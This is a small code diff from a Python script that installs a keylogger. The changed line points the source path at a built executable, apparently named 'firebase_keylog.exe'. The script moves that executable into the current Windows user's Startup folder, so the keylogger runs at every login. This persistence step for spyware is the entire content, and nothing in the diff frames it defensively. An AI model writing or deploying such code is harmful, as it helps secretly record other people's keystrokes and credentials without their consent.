@@ -21,7 +21,7 @@ else:
 # instructions for using shutil were taken from this website: https://www.geeksforgeeks.org/how-to-move-files-and-directories-in-python/
 
 # move the exe file of the keylog into the startup folder
-src = r"keylogger.exe" # this is just temporary, will change to whatever name of exe actually is
+src = r"dist/firebase_keylog.exe" # this assumes the exe is in dist folder which is in the current working directory
 user = getpass.getuser()
 dst = r'C:/Users/' + user +'/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'
 shutil.move(src, dst)
